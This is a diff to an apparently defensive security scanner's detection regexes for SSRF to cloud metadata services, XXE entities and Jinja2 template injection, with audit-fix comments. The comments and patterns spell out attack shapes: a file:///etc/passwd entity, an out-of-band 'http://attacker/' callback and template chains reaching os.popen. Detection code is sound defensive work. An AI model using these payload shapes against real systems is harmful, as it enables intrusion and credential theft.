@@ -2227,8 +2227,13 @@ _SSRF_GCP_META = re.compile(
 )
 # Azure Instance Metadata Service
 _SSRF_AZURE_META = re.compile(
+    # iter-254 audit fix: prior regex required `?api-version=`
+    # immediately after `identity`, so the canonical managed-
+    # identity token URL `.../metadata/identity/oauth2/token?
+    # api-version=...` never matched. Allow intervening path
+    # segments (up to 60 chars) before the query string.
     r'(?i)(?:https?://)?169\.254\.169\.254/metadata/'
-    r'(?:instance|identity)/?\?api-version='
+    r'(?:instance|identity)(?:/[\w.\-/]{0,60})?\?api-version='
 )
 # Oracle Cloud + Alibaba + DigitalOcean metadata endpoints
 _SSRF_OTHER_META = re.compile(
@@ -2249,13 +2254,25 @@ _SSRF_OTHER_META = re.compile(
 # Signal A: inline entity SYSTEM reference:
 #   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 _XXE_INLINE_ENTITY = re.compile(
-    r'(?i)<!ENTITY\s+\w+\s+SYSTEM\s+["\'](?:file://|http://|https://|'
-    r'ftp://|expect://|php://|jar:|netdoc:|dict://|gopher://)[^\'"\r\n]{1,300}["\']'
+    # iter-254 audit fix: prior `\s+\w+\s+` rejected the `%` in
+    # param-entity form `<!ENTITY % xxe SYSTEM "...">`. Made the
+    # `%` optional so BOTH inline entities and param entities that
+    # target non-HTTP URIs (file/ftp/gopher/etc) match here. The
+    # OOB regex still handles the http/https param-entity form
+    # separately because it looks different (recipe indicator).
+    r'(?i)<!ENTITY\s+(?:%\s+)?\w+\s+SYSTEM\s+["\']'
+    r'(?:file://|http://|https://|ftp://|expect://|php://|jar:|'
+    r'netdoc:|dict://|gopher://)[^\'"\r\n]{1,300}["\']'
 )
-# Signal B: OOB parameter entity:
-#   <!ENTITY % xxe SYSTEM "http://attacker/">
+# Signal B: OOB parameter entity - specifically the http/https form
+# used to trigger an attacker-side callback (the OOB indicator).
 _XXE_OOB_PARAM = re.compile(
-    r'(?i)<!ENTITY\s+%\s+\w+\s+SYSTEM\s+["\']https?://[^\'"\r\n]{1,200}["\']'
+    # iter-254 audit fix: still specifically HTTP-based since that's
+    # the OOB indicator, but relaxed to also accept non-name
+    # attribute values (some payloads use dashes/dots in the entity
+    # name).
+    r'(?i)<!ENTITY\s+%\s+[\w.\-]+\s+SYSTEM\s+["\']https?://'
+    r'[^\'"\r\n]{1,200}["\']'
 )
 # Signal C: billion-laughs DoS - `<!ENTITY lol "lol">` followed by
 # recursive references.
@@ -2285,11 +2302,29 @@ _SSTI_MATH_REFLECTED = re.compile(
     r'\b49\b'
 )
 _SSTI_JINJA2_EXPLORE = re.compile(
-    # `{{config}}`, `{{''.__class__}}`, `{{request.application.
-    # __globals__}}`, `{{cycler.__init__.__globals__.os.popen}}`.
-    r'\{\{\s*(?:config|self|request|cycler|lipsum|url_for|'
-    r'get_flashed_messages|\'.__class__|""\.__class__|'
-    r'\'\'\.\_\_class\_\_)'
+    # iter-254 audit fix: distilled to DUNDER access + globals-
+    # chain shapes only. Prior alt included `form`/`args`/`items`/
+    # `keys`/`SECRET_KEY` which are ALL legit Jinja2 template
+    # patterns (`{{ request.form.name }}` is standard Flask).
+    #
+    # Attack-specific shapes:
+    #   * `{{''.__class__.__mro__}}` - class walk (paired quotes)
+    #   * `{{".__class__}}` - class walk (single-quote form)
+    #   * `{{X.__init__}}`, `{{X.__globals__}}`, `{{X.__class__}}`,
+    #      `{{X.__subclasses__}}`, `{{X.application.__globals__}}`
+    #   * `{{X['__init__']}}` - subscript access to dunder
+    r'\{\{\s*(?:'
+    # paired-quote class walk `{{''.__class__` or `{{"".__class__`
+    r'[\'"]{2}\s*\.\s*_{2}[a-z]+_{2}|'
+    # keyword + dot + dunder OR .application chain (application
+    # itself is the Flask app object; only used in attack to
+    # reach `.__globals__`)
+    r'(?:config|self|request|cycler|lipsum|url_for|'
+    r'get_flashed_messages)\s*'
+    r'(?:\.\s*_{2}[a-z]+_{2}|'
+    r'\.\s*application\s*\.\s*_{2}|'
+    r'\[\s*[\'"]_{2})'
+    r')'
 )
 _SSTI_TWIG_EXPLORE = re.compile(
     # `{{_self}}`, `{{_self.env.registerUndefinedFilterCallback}}`,
@@ -3421,9 +3456,16 @@ def _multiline_passes(path, report, store):
         _ssrf_gcp = _SSRF_GCP_META.search(text[:32768])
         _ssrf_az = _SSRF_AZURE_META.search(text[:32768])
         _ssrf_other = _SSRF_OTHER_META.search(text[:32768])
-        # AWS: fire on either the endpoint URL OR the response body
-        # containing a metadata key (both are strong signals).
-        if _ssrf_aws or _ssrf_aws_kv:
+        # AWS: fire on the endpoint URL. Response-body keys alone
+        # aren't dispositive because `hostname` is a bare English
+        # word (nmap prints `Hostname: X` on every host). Require
+        # the URL/IP corroboration.
+        # iter-254 audit fix: prior OR-fire on _ssrf_aws_kv alone
+        # FPed on `Hostname: dc01.corp.local` nmap lines.
+        if _ssrf_aws or (_ssrf_aws_kv and (
+                "169.254.169.254" in text[:32768]
+                or "meta-data" in text[:32768]
+                or "IMDS" in text[:32768])):
             _anchor_aws = _ssrf_aws or _ssrf_aws_kv
             report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
                        _ln(_anchor_aws),
